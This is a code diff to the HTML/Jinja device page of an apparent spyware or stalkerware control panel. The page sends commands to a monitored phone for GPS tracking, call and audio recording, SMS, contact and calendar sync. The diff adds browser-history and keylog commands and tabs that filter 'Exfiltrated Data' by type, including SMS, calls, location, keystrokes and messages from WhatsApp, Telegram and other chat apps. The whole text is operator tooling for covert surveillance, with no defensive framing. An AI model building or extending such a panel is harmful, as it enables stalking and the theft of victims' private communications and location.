@@ -15,21 +15,29 @@
         table { width: 100%; border-collapse: collapse; }
         th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #222; font-size: 13px; }
         th { background: #111; color: #666; font-size: 11px; text-transform: uppercase; }
-        .cmd-form { margin: 20px 0; display: flex; gap: 10px; align-items: center; }
+        .cmd-form { margin: 20px 0; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
         .cmd-form select, .cmd-form input { background: #111; border: 1px solid #333; color: #e0e0e0; padding: 8px 12px; border-radius: 4px; }
         .cmd-form button { background: #00ff88; color: #000; border: none; padding: 8px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
         .cmd-form button:hover { background: #00cc6a; }
         .payload { max-width: 500px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #888; }
         .status-pending { color: #ffaa00; }
         .status-sent { color: #00ff88; }
+        .tabs { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 15px; }
+        .tab { background: #111; border: 1px solid #333; color: #888; padding: 6px 14px; border-radius: 4px; cursor: pointer; font-size: 12px; }
+        .tab.active { background: #00ff88; color: #000; border-color: #00ff88; font-weight: bold; }
+        .tab-panel { display: none; }
+        .tab-panel.active { display: block; }
+        .badge { display: inline-block; background: #333; color: #aaa; border-radius: 10px; padding: 1px 7px; font-size: 11px; margin-left: 4px; }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>Device: {{ device_id[:24] }}...</h1>
-        <a href="/">Back to Dashboard</a>
+        <a href="/">&#8592; Back to Dashboard</a>
     </div>
     <div class="content">
+
+        <!-- ═══════════════ COMMAND PANEL ═══════════════ -->
         <div class="section-title">Send Command</div>
         <div class="cmd-form">
             <select id="cmd">
@@ -38,7 +46,7 @@
                     <option value="stop_location">Stop GPS Tracking</option>
                 </optgroup>
                 <optgroup label="Calls">
-                    <option value="start_call_record">Record Calls</option>
+                    <option value="start_call_record">Record Calls (VOICE_CALL source)</option>
                     <option value="stop_call_record">Stop Call Recording</option>
                 </optgroup>
                 <optgroup label="Audio">
@@ -59,7 +67,9 @@
                     <option value="sync_contacts">Sync Contacts</option>
                     <option value="sync_sms">Sync SMS</option>
                     <option value="sync_appusage">Sync App Usage</option>
-                    <option value="sync_calendar">Sync Calendar</option>
+                    <option value="sync_calendar">Sync Calendar Events</option>
+                    <option value="sync_browser_history">Sync Browser History</option>
+                    <option value="flush_keylog">Flush Keylog Buffer</option>
                 </optgroup>
                 <optgroup label="System">
                     <option value="get_device_info">Get Device Info</option>
@@ -79,23 +89,42 @@
             <button onclick="sendCmd()">Send</button>
         </div>
 
+        <!-- ═══════════════ EXFIL DATA TABS ═══════════════ -->
         <div class="section-title">Exfiltrated Data</div>
-        <table>
-            <thead><tr><th>Type</th><th>Time</th><th>Payload</th></tr></thead>
-            <tbody>
-            {% for e in exfil %}
-            <tr>
-                <td>{{ e.data_type }}</td>
-                <td>{{ e.created_at }}</td>
-                <td class="payload">{{ e.payload[:100] if e.payload else '' }}</td>
-            </tr>
-            {% endfor %}
-            {% if not exfil %}
-            <tr><td colspan="3" style="color:#666;text-align:center;">No data yet</td></tr>
-            {% endif %}
-            </tbody>
-        </table>
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('all', this)">All</div>
+            <div class="tab" onclick="switchTab('sms', this)">SMS</div>
+            <div class="tab" onclick="switchTab('call', this)">Calls</div>
+            <div class="tab" onclick="switchTab('location', this)">Location</div>
+            <div class="tab" onclick="switchTab('contact', this)">Contacts</div>
+            <div class="tab" onclick="switchTab('im', this)">IM / Chat</div>
+            <div class="tab" onclick="switchTab('keylog', this)">Keylog</div>
+            <div class="tab" onclick="switchTab('calendar', this)">Calendar</div>
+            <div class="tab" onclick="switchTab('browser', this)">Browser</div>
+            <div class="tab" onclick="switchTab('notification', this)">Notifications</div>
+            <div class="tab" onclick="switchTab('app_usage', this)">App Usage</div>
+            <div class="tab" onclick="switchTab('other', this)">Other</div>
+        </div>
 
+        <div id="exfil-table-container">
+            <table id="exfil-table">
+                <thead><tr><th>Type</th><th>Time</th><th>Payload</th></tr></thead>
+                <tbody id="exfil-tbody">
+                {% for e in exfil %}
+                <tr data-type="{{ e.data_type }}">
+                    <td><span style="color:#00ff88">{{ e.data_type }}</span></td>
+                    <td>{{ e.created_at }}</td>
+                    <td class="payload" title="{{ e.payload or '' }}">{{ e.payload[:120] if e.payload else '' }}</td>
+                </tr>
+                {% endfor %}
+                {% if not exfil %}
+                <tr><td colspan="3" style="color:#666;text-align:center;">No data yet</td></tr>
+                {% endif %}
+                </tbody>
+            </table>
+        </div>
+
+        <!-- ═══════════════ COMMAND HISTORY ═══════════════ -->
         <div class="section-title">Command History</div>
         <table>
             <thead><tr><th>Command</th><th>Status</th><th>Created</th><th>Executed</th></tr></thead>
@@ -114,7 +143,9 @@
             </tbody>
         </table>
     </div>
+
     <script>
+        // ── Command sender ──
         async function sendCmd() {
             const cmd = document.getElementById('cmd').value;
             const args = document.getElementById('args').value || null;
@@ -124,6 +155,29 @@
                 body: JSON.stringify({device_id: '{{ device_id }}', cmd: cmd, args: args})
             });
             location.reload();
+        }
+
+        // ── Tab filtering ──
+        const IM_TYPES = ['im','im_whatsapp','im_telegram','im_instagram','im_facebook',
+                          'im_viber','im_skype','im_vk','im_gmail','im_deepseek','im_grok'];
+        const BROWSER_TYPES = ['browser_history','browser_url'];
+        const OTHER_TYPES = ['screencap','camera','audio','device_info','files','clipboard',
+                             'battery','sim','network','livestream'];
+
+        function switchTab(tab, el) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            el.classList.add('active');
+            const rows = document.querySelectorAll('#exfil-tbody tr[data-type]');
+            rows.forEach(row => {
+                const t = row.dataset.type;
+                let show = false;
+                if (tab === 'all') show = true;
+                else if (tab === 'im') show = IM_TYPES.includes(t);
+                else if (tab === 'browser') show = BROWSER_TYPES.includes(t);
+                else if (tab === 'other') show = OTHER_TYPES.includes(t);
+                else show = t === tab;
+                row.style.display = show ? '' : 'none';
+            });
         }
     </script>
 </body>
